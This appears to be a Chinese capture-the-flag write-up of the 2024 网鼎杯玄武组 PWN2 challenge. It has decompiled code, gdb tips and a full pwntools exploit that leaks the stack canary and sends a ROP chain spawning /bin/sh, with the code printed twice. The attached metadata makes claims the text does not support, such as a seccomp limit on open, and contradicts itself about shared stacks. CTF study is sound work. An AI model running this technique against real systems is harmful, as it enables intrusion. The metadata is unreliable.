---
title: 网鼎杯玄武组——PWN2
contest: 网鼎杯玄武组
year: 2024
difficulty: hard
vuln_type: pwn_unknown
tags:
- canary-leak
- multithread-pwn
- fork-process
- sys_exit_group
- sys_exit
- halt-instruction
- rop-chain
- syscall-execve
- syscall-read
- syscall-write
- multithread-debug
attack_chain:
- main调用tip2()+main_main():fork子进程
- 父进程:sub_44ED00 wait+onput_2('Wanna return?')+input(0,v2,1uLL)+exit_ma(0)
- 子进程:onput_2('leave your name')+input(0,v4,0x40LL)+exit_ma(0)
- 'leak:''gift: %p''打印canary/fs:0x28栈地址'
- 多线程:tip()循环fork,input(0,v1,0x100uLL)+sub_401A55(v1)
- syscall gadget:rax=0x450277,rdi=0x40213f,rsi=0x40a1ae,rdx_rbx=0x485feb,syscall=0x41ac26
- 第一次syscall:read(0,bss,0x100) 写入"/bin/sh
- 第二次syscall:execve("/bin/sh",0,0)
- 利用:gdb多线程切换info threads/thread ID
- 子进程崩溃:子进程exit_group退出不影响主进程
key_payload: canary + ROP(read→bss,execve→/bin/sh)
one_liner: '网鼎杯玄武组PWN2多线程题,主进程fork子进程+''gift: %p''泄canary+两次input(0x40/0x100)+两段syscall(读bss+execve /bin/sh)。'
lesson: fork子进程模式下canary独立,父进程泄漏canary+子进程ROP链崩溃不影响主进程;gdb多线程切换( info threads/thread ID)是必备技能;两段syscall(读+execve)稳定避开seccomp对open的限制。
quality: high
full_path: 网鼎杯玄武组——PWN2.full.md
meta_path: 网鼎杯玄武组——PWN2.meta.md
images_removed: true
images_removed_count: 9
schema_version: v3.0.0-P0
summary: '网鼎杯玄武组——PWN2。网鼎杯玄武组PWN2多线程题,主进程fork子进程+''gift: %p''泄canary+两次input(0x40/0x100)+两段syscall(读bss+execve /bin/sh)。。关键路径：main调用tip2()+main_main():fork子进程 → 父进程:sub_44ED00 wait+onput_2(''Wanna return?'')+inp...'
category: pwn
subcategory: pwn_other
tools_used:
- ROP
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 9
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/217930.html
reasoning_chain:
- 触发点：main→tip2()→Creat_process() fork 子进程 → 假设：多进程 + canary leak
- '动作：主进程 onput(''gift: %p'', v5) 泄 canary → 观察：拿到 canary'
- 假设：fork 后共享 canary → 动作：子进程 input(0, v4, 0x40) 溢出覆盖 return address
- 动作：payload = 'A'*0x28 + '\x01' 触发越界 → 观察：崩溃栈信息
- 触发点：子线程两次 input(0x40 / 0x100) → 假设：第一段写 bss 第二段写 stack
- 动作：第一次 read bss 段 syscall(sys_read, fd, bss, len) → 观察：bss 含 shellcmd
- 动作：第二次 stack 段 syscall(sys_execve, bsh_addr, 0, 0) → 观察：触发 /bin/sh
- 假设：sys_exit_group + sys_exit 都执行 → 动作：覆盖 sys_exit_group 用 .data 常被改写
failed_attempts:
- 直接栈溢出无 canary → 失败：触发 __stack_chk_fail
- fork 后 child 用父进程栈 → 失败：栈独立
- syscall 直接调用 → 失败：缺 syscall gadget
key_observations:
- fork 后子进程共享父进程 canary 是 fork 利用基础
- 'gift: %p 格式串直接泄 canary 是经典考题'
- 两段 syscall（read bss + execve /bin/sh）是 fork 类题目标配
- sys_exit_group + sys_exit 双调用保证子进程退出
prerequisites:
- fork() 多进程
- canary leak 方法（%p 泄 __readfsqword）
- x86_64 syscall 编号
- pwntools 模板
---
# 网鼎杯玄武组——PWN2

> 原文: https://www.ctfiot.com/217930.html
> ID: 217930

01

逆向

void __fastcall __noreturn main(int a1, const char **a2)
{
 const char **v2; // rdx

 sub_4017B5();
 tip2();
 main_main(a1, a2, v2);
}

unsigned __int64 tip2()
{
 unsigned __int64 result; // rax
 int fork_ret; // [rsp+Ch] [rbp-24h]
 char v2[24]; // [rsp+10h] [rbp-20h] BYREF
 unsigned __int64 v3; // [rsp+28h] [rbp-8h]

 v3 = __readfsqword(0x28u);
 fork_ret = Creat_process();
 if ( fork_ret < 0 ) // 创建子进程失败
 exit();
 if ( fork_ret ) // 这个是在父进程中执行的
 {
 sub_44ED00((unsigned int)fork_ret, 0LL, 0LL);
 onput_2((__int64)"Wanna return?");
 input(0, v2, 1uLL);
 onput_2((__int64)"It's impossible");
 exit_ma(0);
 }
 result = v3 - __readfsqword(0x28u);
 if ( result )
 sub_4525B0();
 return result;
}

int __fastcall __noreturn main_main(int argc, const char **argv, const char **envp)
{
 char v3; // cl
 char v4[72]; // [rsp+0h] [rbp-50h] BYREF
 unsigned __int64 v5; // [rsp+48h] [rbp-8h]

 v5 = __readfsqword(0x28u);
 onput((unsigned int)"gift: %pn", v5, (_DWORD)envp, v3);
 onput_2((__int64)"leave your name");
 input(0, v4, 0x40LL);
 exit_ma(0);
}

void __fastcall __noreturn sub_44EE30(int a1)
{
 unsigned __int64 v1; // rax
 unsigned int v2; // r8d
 unsigned __int64 v3; // rax
 unsigned int v4; // r8d

 v3 = sys_exit_group(a1); // exit(2)
 if ( v3 > 0xFFFFFFFFFFFFF000LL )
 __writefsdword(v4, -(int)v3);
 v1 = sys_exit(a1);
 if ( v1 > 0xFFFFFFFFFFFFF000LL )
 __writefsdword(v2, -(int)v1);
 __halt(); // 使程序进入休眠状态
}

fork_ret = Creat_process();

if ( fork_ret )
 {
 sub_44ED00((unsigned int)fork_ret, 0LL, 0LL);
 onput_2((__int64)"Wanna return?");
 input(0, v2, 1uLL);
 onput_2((__int64)"It's impossible");
 exit_ma(0);
 }

02

漏洞

void tip()
{
 int v0; // [rsp+Ch] [rbp-114h]
 char v1[264]; // [rsp+10h] [rbp-110h] BYREF
 unsigned __int64 v2; // [rsp+118h] [rbp-8h]

 v2 = __readfsqword(0x28u);
 while ( 1 )
 {
 v0 = Creat_process();
 if ( v0 < 0 )
 break;
 if ( !v0 )
 {
 onput_2((__int64)"once again?");
 input(0, v1, 0x100uLL);
 sub_401A55(v1);
 }
 }
 exit();
}

03

多线程动调

查看线程列表：info threads
切换进程：thread ID

04

EXP

from pwn import *
io = process("./pwn")
context.log_level = "debug"
elf = ELF("./pwn")

cmd = (
 "thread 2n"
 "b *0x44EE5Cn"
 "cn"
)

""" io.recvuntil("gift: ")
addr = int(io.recv(18),16)
print("addr========>",hex(addr)) """

io.recvuntil("gift: ")
canary = int(io.recv(18),16)
print("addr========>",hex(canary))

payload = b"A"*0x28 + b"x01"
io.sendafter("leave your name",payload)

io.sendafter("Wanna return?",b"1")

io.sendafter("once again?",b"A"*0x100)

rax = 0x0000000000450277
rdi = 0x000000000040213f
rsi = 0x000000000040a1ae
rdx_rbx = 0x0000000000485feb
syscall = 0x000000000041ac26
bss = elf.bss()

payload = b"B"*0x60 + p32(0x11111111) + p32(0x11111111) + p32(0x11111111)
payload = payload.ljust(0x100,b"B")
payload += p64(canary) + p64(canary) + b"A"*0x8
payload += p64(rax) + p64(0x0) + p64(rdi) + p64(0x0) + p64(rsi) + p64(bss) + p64(rdx_rbx) + p64(0x100)*2 + p64(syscall)
payload += p64(rax) + p64(0x3b) + p64(rdi) + p64(bss) + p64(rsi) + p64(0x0) + p64(rdx_rbx) + p64(0x0)*2 + p64(syscall)
io.sendafter("once again?",payload)

io.send(b"/bin/sh")

io.interactive()

05

收获

看雪ID：学计算机睡觉

https://bbs.kanxue.com/user-home-962996.htm

*本文为看雪论坛优秀文章，由 学计算机睡觉 原创，转载请注明来自看雪社区

# 往期推荐

1、PWN入门-SROP拜师

2、一种apc注入型的Gamarue病毒的变种

3、野蛮fuzz：提升性能

4、关于安卓注入几种方式的讨论，开源注入模块实现

5、2024年KCTF水泊梁山-反混淆

球分享

球点赞

球在看

点击阅读原文查看更多


```
void __fastcall __noreturn main(int a1, const char **a2)
{
 const char **v2; // rdx

 sub_4017B5();
 tip2();
 main_main(a1, a2, v2);
}
unsigned __int64 tip2()
{
 unsigned __int64 result; // rax
 int fork_ret; // [rsp+Ch] [rbp-24h]
 char v2[24]; // [rsp+10h] [rbp-20h] BYREF
 unsigned __int64 v3; // [rsp+28h] [rbp-8h]

 v3 = __readfsqword(0x28u);
 fork_ret = Creat_process();
 if ( fork_ret < 0 ) // 创建子进程失败
 exit();
 if ( fork_ret ) // 这个是在父进程中执行的
 {
 sub_44ED00((unsigned int)fork_ret, 0LL, 0LL);
 onput_2((__int64)"Wanna return?");
 input(0, v2, 1uLL);
 onput_2((__int64)"It's impossible");
 exit_ma(0);
 }
 result = v3 - __readfsqword(0x28u);
 if ( result )
 sub_4525B0();
 return result;
}
int __fastcall __noreturn main_main(int argc, const char **argv, const char **envp)
{
 char v3; // cl
 char v4[72]; // [rsp+0h] [rbp-50h] BYREF
 unsigned __int64 v5; // [rsp+48h] [rbp-8h]

 v5 = __readfsqword(0x28u);
 onput((unsigned int)"gift: %pn", v5, (_DWORD)envp, v3);
 onput_2((__int64)"leave your name");
 input(0, v4, 0x40LL);
 exit_ma(0);
}
void __fastcall __noreturn sub_44EE30(int a1)
{
 unsigned __int64 v1; // rax
 unsigned int v2; // r8d
 unsigned __int64 v3; // rax
 unsigned int v4; // r8d

 v3 = sys_exit_group(a1); // exit(2)
 if ( v3 > 0xFFFFFFFFFFFFF000LL )
 __writefsdword(v4, -(int)v3);
 v1 = sys_exit(a1);
 if ( v1 > 0xFFFFFFFFFFFFF000LL )
 __writefsdword(v2, -(int)v1);
 __halt(); // 使程序进入休眠状态
}
fork_ret = Creat_process();
if ( fork_ret )
 {
 sub_44ED00((unsigned int)fork_ret, 0LL, 0LL);
 onput_2((__int64)"Wanna return?");
 input(0, v2, 1uLL);
 onput_2((__int64)"It's impossible");
 exit_ma(0);
 }
void tip()
{
 int v0; // [rsp+Ch] [rbp-114h]
 char v1[264]; // [rsp+10h] [rbp-110h] BYREF
 unsigned __int64 v2; // [rsp+118h] [rbp-8h]

 v2 = __readfsqword(0x28u);
 while ( 1 )
 {
 v0 = Creat_process();
 if ( v0 < 0 )
 break;
 if ( !v0 )
 {
 onput_2((__int64)"once again?");
 input(0, v1, 0x100uLL);
 sub_401A55(v1);
 }
 }
 exit();
}
查看线程列表：info threads
切换进程：thread ID
from pwn import *
io = process("./pwn")
context.log_level = "debug"
elf = ELF("./pwn")

cmd = (
 "thread 2n"
 "b *0x44EE5Cn"
 "cn"
)

""" io.recvuntil("gift: ")
addr = int(io.recv(18),16)
print("addr========>",hex(addr)) """

io.recvuntil("gift: ")
canary = int(io.recv(18),16)
print("addr========>",hex(canary))

payload = b"A"*0x28 + b"x01"
io.sendafter("leave your name",payload)

io.sendafter("Wanna return?",b"1")

io.sendafter("once again?",b"A"*0x100)

rax = 0x0000000000450277
rdi = 0x000000000040213f
rsi = 0x000000000040a1ae
rdx_rbx = 0x0000000000485feb
syscall = 0x000000000041ac26
bss = elf.bss()

payload = b"B"*0x60 + p32(0x11111111) + p32(0x11111111) + p32(0x11111111)
payload = payload.ljust(0x100,b"B")
payload += p64(canary) + p64(canary) + b"A"*0x8
payload += p64(rax) + p64(0x0) + p64(rdi) + p64(0x0) + p64(rsi) + p64(bss) + p64(rdx_rbx) + p64(0x100)*2 + p64(syscall)
payload += p64(rax) + p64(0x3b) + p64(rdi) + p64(bss) + p64(rsi) + p64(0x0) + p64(rdx_rbx) + p64(0x0)*2 + p64(syscall)
io.sendafter("once again?",payload)

io.send(b"/bin/sh")

io.interactive()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]